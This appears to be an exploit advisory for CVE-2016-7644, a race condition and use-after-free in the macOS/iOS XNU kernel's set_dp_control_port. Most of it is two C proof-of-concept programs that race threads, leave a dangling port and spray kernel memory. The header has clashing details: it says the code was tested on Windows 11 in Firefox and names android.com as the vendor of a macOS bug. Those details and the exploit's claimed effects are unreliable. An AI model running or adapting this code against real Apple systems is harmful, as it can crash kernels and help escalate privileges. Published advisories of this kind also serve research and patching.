@@ -1,0 +1,431 @@
+=============================================================================================================================================
+| # Title     : macOS 10.12.2 XNU kernel Race Condition                                                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.android.com                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212493/ & 	CVE-2016-7644
+
+[+] Summary : This report analyzes the race condition observed in the set_dp_control_port function within XNU kernel versions prior to macOS 10.12.2 and iOS 10.2.
+              
+[+] The vulnerability exists in the XNU kernel (iOS/macOS) in the `set_dp_control_port` function. The issue is the lack of locking when the dynamic_pager_control_port pointer is updated, leading to:
+
+A race condition between two threads
+
+The possibility of double release of the port reference
+
+Use-after-free access
+
+[+]  POC :	
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <mach/mach.h>
+#include <mach/host_priv.h>
+
+#define THREAD_COUNT 32
+#define ATTEMPTS 1000
+
+mach_port_t global_port = MACH_PORT_NULL;
+int start_race = 0;
+
+// خيط يقوم باستدعاء set_dp_control_port بشكل متكرر
+void* race_thread(void* arg) {
+    while (!start_race) { ; } // انتظار بدء السباق
+    
+    mach_port_t local_port = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &local_port);
+    mach_port_insert_right(mach_task_self(), local_port, local_port, 
+                          MACH_MSG_TYPE_MAKE_SEND);
+    
+    for (int i = 0; i < 100; i++) {
+        set_dp_control_port(mach_host_self(), local_port);
+    }
+    
+    return NULL;
+}
+
+// خيط لمراقبة واستغلال الحالة
+void* exploit_thread(void* arg) {
+    while (!start_race) { ; }
+    
+    for (int i = 0; i < 100; i++) {
+        // محاولة الوصول إلى المنفذ بعد تحريره
+        mach_port_t probe_port = MACH_PORT_NULL;
+        kern_return_t kr = mach_port_allocate(mach_task_self(), 
+                                            MACH_PORT_RIGHT_RECEIVE, 
+                                            &probe_port);
+        
+        if (kr != KERN_SUCCESS) {
+            printf("[!] Failed to allocate port - possible corruption\n");
+        }
+        
+        // استخدام منفذات مختلفة لمحاولة إعادة استخدام الذاكرة المحررة
+        set_dp_control_port(mach_host_self(), probe_port);
+        
+        usleep(1000); // تأخير صغير لزيادة فرص السباق
+    }
+    
+    return NULL;
+}
+
+int main() {
+    printf("[+] Starting exploitation of CVE-2016-7644\n");
+    
+    // الخطوة 1: إنشاء المنفذ الأولي
+    kern_return_t kr = mach_port_allocate(mach_task_self(), 
+                                        MACH_PORT_RIGHT_RECEIVE, 
+                                        &global_port);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to allocate initial port\n");
+        return 1;
+    }
+    
+    kr = mach_port_insert_right(mach_task_self(), global_port, global_port,
+                               MACH_MSG_TYPE_MAKE_SEND);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to insert port right\n");
+        return 1;
+    }
+    
+    // الخطوة 2: تعيين المنفذ الأولي
+    printf("[+] Setting initial dynamic_pager_control_port\n");
+    kr = set_dp_control_port(mach_host_self(), global_port);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Initial set failed: %s\n", mach_error_string(kr));
+        return 1;
+    }
+    
+    // الخطوة 3: تحرير المنفذ من userland (يبقى مرجع في kernel فقط)
+    printf("[+] Releasing userland reference (kernel holds one ref)\n");
+    mach_port_destroy(mach_task_self(), global_port);
+    
+    // الخطوة 4: إنشاء خيوط لتنفيذ الهجوم
+    pthread_t threads[THREAD_COUNT];
+    
+    printf("[+] Creating %d racing threads\n", THREAD_COUNT);
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        if (i % 2 == 0) {
+            pthread_create(&threads[i], NULL, race_thread, NULL);
+        } else {
+            pthread_create(&threads[i], NULL, exploit_thread, NULL);
+        }
+    }
+    
+    // الخطوة 5: بدء السباق
+    printf("[+] Starting race condition...\n");
+    start_race = 1;
+    
+    // الانتظار حتى تنتهي الخيوط
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        pthread_join(threads[i], NULL);
+    }
+    
+    printf("[+] Race completed. Attempting to trigger UaF...\n");
+    
+    // الخطوة 6: محاولة استغلال dangling pointer
+    for (int attempt = 0; attempt < ATTEMPTS; attempt++) {
+        mach_port_t new_port = MACH_PORT_NULL;
+        kr = mach_port_allocate(mach_task_self(), 
+                              MACH_PORT_RIGHT_RECEIVE, 
+                              &new_port);
+        
+        if (kr == KERN_SUCCESS) {
+            kr = mach_port_insert_right(mach_task_self(), new_port, new_port,
+                                       MACH_MSG_TYPE_MAKE_SEND);
+            
+            // محاولة تعيين منفذ جديد في الموقع المحرر
+            kr = set_dp_control_port(mach_host_self(), new_port);
+            
+            if (kr != KERN_SUCCESS) {
+                printf("[!] Attempt %d: set_dp_control_port failed: %s\n",
+                      attempt, mach_error_string(kr));
+            }
+            
+            // إرسال رسالة للمساعدة في كشف أي تحطم
+            mach_msg_header_t msg = {0};
+            msg.msgh_remote_port = new_port;
+            msg.msgh_size = sizeof(msg);
+            
+            kr = mach_msg(&msg, MACH_SEND_MSG, msg.msgh_size,
+                         0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, 
+                         MACH_PORT_NULL);
+        }
+        
+        if (attempt % 100 == 0) {
+            printf("[.] Progress: %d/%d attempts\n", attempt, ATTEMPTS);
+        }
+    }
+    
+    printf("[+] Exploitation attempt finished\n");
+    printf("[+] Check kernel logs for crashes (panic logs)\n");
+    
+    return 0;
+}
+
+================
+Vulnerability type: Use-After-Free (UaF) in the XNU kernel's set_dp_control_port function.
+
+Basic idea: Creating a dangling port in the kernel, then attempting to reuse it to exploit the freed memory, which could lead to:
+
+Arbitrary kernel instruction execution.
+
+A system crash (kernel panic).
+
+In some cases, user privilege escalation if linked to a full exploit.
+
+POC :
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <mach/mach.h>
+#include <mach/host_priv.h>
+#include <sched.h>
+
+#define THREAD_COUNT 32
+#define PORT_COUNT 1024
+#define ATTEMPTS 1000
+
+int start_race = 0;
+int stop_threads = 0;
+mach_port_t spray_ports[PORT_COUNT];
+
+// وظيفة yield لزيادة فرص السباق
+void yield_thread() {
+    sched_yield();  // يعطي فرصة للخيوط الأخرى للتشغيل
+    usleep(10);     // تأخير بسيط
+}
+
+// خيط السباق الرئيسي
+void* trigger_race(void* arg) {
+    mach_port_t port = (mach_port_t)(uintptr_t)arg;
+    
+    while (!start_race) { ; } // انتظار إشارة البدء
+    
+    // إجراء السباق مع yield
+    for (int i = 0; i < 50; i++) {
+        set_dp_control_port(mach_host_self(), port);
+        yield_thread();  // زيادة فرص التداخل
+    }
+    
+    return NULL;
+}
+
+// إنشاء dangling port
+void create_dangling_port() {
+    mach_port_t port = MACH_PORT_NULL;
+    
+    // إنشاء port مع multiple references
+    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to allocate port\n");
+        return;
+    }
+    
+    // إضافة حقين send ليكون لدينا مرجعان
+    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed first insert\n");
+        return;
+    }
+    
+    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed second insert\n");
+        return;
+    }
+    
+    // تعيينه كـ dynamic_pager_control_port
+    printf("[+] Setting as dynamic_pager_control_port\n");
+    kr = set_dp_control_port(mach_host_self(), port);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to set: %s\n", mach_error_string(kr));
+        return;
+    }
+    
+    // الآن النواة تحتفظ بمرجع واحد، ونحن لدينا مرجعان
+    
+    // تحرير مرجع userland (يبقى مرجعان: واحد في kernel وواحد لدينا)
+    printf("[+] Releasing one userland reference\n");
+    mach_port_deallocate(mach_task_self(), port);
+    
+    // بدء السباق مع خيطين
+    printf("[+] Starting race threads\n");
+    start_race = 0;
+    
+    pthread_t t1, t2;
+    pthread_create(&t1, NULL, trigger_race, (void*)(uintptr_t)port);
+    pthread_create(&t2, NULL, trigger_race, (void*)(uintptr_t)port);
+    
+    // إعطاء الوقت للخيوط للاستعداد
+    usleep(1000);
+    
+    // بدء السباق
+    start_race = 1;
+    
+    // الانتظار حتى تنتهي الخيوط
+    pthread_join(t1, NULL);
+    pthread_join(t2, NULL);
+    
+    printf("[+] Race completed. Port may be dangling now\n");
+    
+    // هنا port أصبح dangling (مؤشر متدلي)
+    // kernel قد حررت الـ port مرتين بينما كان هناك مرجع واحد فقط
+}
+
+// رش kernel memory
+void spray_kernel_memory() {
+    printf("[+] Spraying kernel memory with %d ports\n", PORT_COUNT);
+    
+    // إنشاء منافذ للرش
+    for (int i = 0; i < PORT_COUNT; i++) {
+        kern_return_t kr = mach_port_allocate(mach_task_self(), 
+                                            MACH_PORT_RIGHT_RECEIVE, 
+                                            &spray_ports[i]);
+        if (kr != KERN_SUCCESS) {
+            printf("[!] Failed to allocate spray port %d\n", i);
+            continue;
+        }
+        
+        kr = mach_port_insert_right(mach_task_self(), spray_ports[i], 
+                                  spray_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+        if (kr != KERN_SUCCESS) {
+            printf("[!] Failed to insert right for port %d\n", i);
+        }
+        
+        // إرسال رسائل لملء kernel memory
+        struct {
+            mach_msg_header_t header;
+            mach_msg_body_t body;
+            mach_msg_port_descriptor_t port_descriptors[4];
+        } msg;
+        
+        msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | 
+                              MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        msg.header.msgh_size = sizeof(msg);
+        msg.header.msgh_remote_port = spray_ports[i];
+        msg.header.msgh_local_port = MACH_PORT_NULL;
+        msg.body.msgh_descriptor_count = 4;
+        
+        // ملء واصف المنافذ
+        for (int j = 0; j < 4; j++) {
+            msg.port_descriptors[j].name = spray_ports[(i + j) % PORT_COUNT];
+            msg.port_descriptors[j].disposition = MACH_MSG_TYPE_COPY_SEND;
+            msg.port_descriptors[j].type = MACH_MSG_PORT_DESCRIPTOR;
+        }
+        
+        kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg),
+                     0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+        
+        if ((i + 1) % 100 == 0) {
+            printf("[.] Sprayed %d/%d ports\n", i + 1, PORT_COUNT);
+        }
+    }
+    
+    printf("[+] Memory spray completed\n");
+}
+
+// خيط لاختبار استخدام المنفذ المعلق
+void* use_dangling_port(void* arg) {
+    mach_port_t port = (mach_port_t)(uintptr_t)arg;
+    
+    while (!stop_threads) {
+        // محاولة استخدام المنفذ المعلق
+        mach_port_context_t context = 0;
+        kern_return_t kr = mach_port_get_context(mach_task_self(), port, &context);
+        
+        if (kr != KERN_SUCCESS) {
+            // المنفذ قد يكون تحرر
+            printf("[!] Failed to get context (port may be freed)\n");
+            break;
+        }
+        
+        // محاولة تعيين سياق جديد
+        kr = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)0x4141414142424242);
+        
+        yield_thread();
+    }
+    
+    return NULL;
+}
+
+int main() {
+    printf("[+] Exploit for CVE-2016-7644 - XNU set_dp_control_port race condition\n");
+    printf("[+] Target: macOS/iOS <= 10.12.1/10.1.1\n");
+    
+    // المرحلة 1: إنشاء dangling port
+    printf("\n=== Phase 1: Creating dangling port ===\n");
+    create_dangling_port();
+    
+    // المرحلة 2: رش الذاكرة
+    printf("\n=== Phase 2: Memory spraying ===\n");
+    spray_kernel_memory();
+    
+    // المرحلة 3: محاولة الاستغلال
+    printf("\n=== Phase 3: Attempting exploitation ===\n");
+    
+    // إنشاء عدة خيوط لمحاولة استخدام المنفذ المعلق
+    pthread_t exploit_threads[4];
+    mach_port_t test_port = MACH_PORT_NULL;
+    
+    // إنشاء منفذ جديد في نفس المنطقة
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &test_port);
+    mach_port_insert_right(mach_task_self(), test_port, test_port, MACH_MSG_TYPE_MAKE_SEND);
+    
+    for (int i = 0; i < 4; i++) {
+        pthread_create(&exploit_threads[i], NULL, use_dangling_port, 
+                      (void*)(uintptr_t)test_port);
+    }
+    
+    // السماح للخيوط بالعمل لبعض الوقت
+    sleep(2);
+    
+    // إيقاف الخيوط
+    stop_threads = 1;
+    for (int i = 0; i < 4; i++) {
+        pthread_join(exploit_threads[i], NULL);
+    }
+    
+    // المرحلة 4: اختبار الاستقرار
+    printf("\n=== Phase 4: Testing stability ===\n");
+    
+    mach_port_t final_port = MACH_PORT_NULL;
+    kern_return_t kr = mach_port_allocate(mach_task_self(), 
+                                        MACH_PORT_RIGHT_RECEIVE, 
+                                        &final_port);
+    
+    if (kr != KERN_SUCCESS) {
+        printf("[!] Kernel may be unstable/crashed\n");
+    } else {
+        printf("[+] Kernel seems stable\n");
+        
+        // محاولة نهائية لاستدعاء set_dp_control_port
+        kr = set_dp_control_port(mach_host_self(), final_port);
+        if (kr == KERN_SUCCESS) {
+            printf("[+] Successfully called set_dp_control_port\n");
+        } else {
+            printf("[!] Failed: %s\n", mach_error_string(kr));
+        }
+    }
+    
+    // التنظيف
+    for (int i = 0; i < PORT_COUNT; i++) {
+        if (MACH_PORT_VALID(spray_ports[i])) {
+            mach_port_destroy(mach_task_self(), spray_ports[i]);
+        }
+    }
+    
+    printf("\n[+] Exploitation attempt completed\n");
+    printf("[!] Note: This exploit may cause kernel panic if successful\n");
+    printf("[!] Check console logs for kernel crash reports\n");
+    
+    return 0;
+}
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
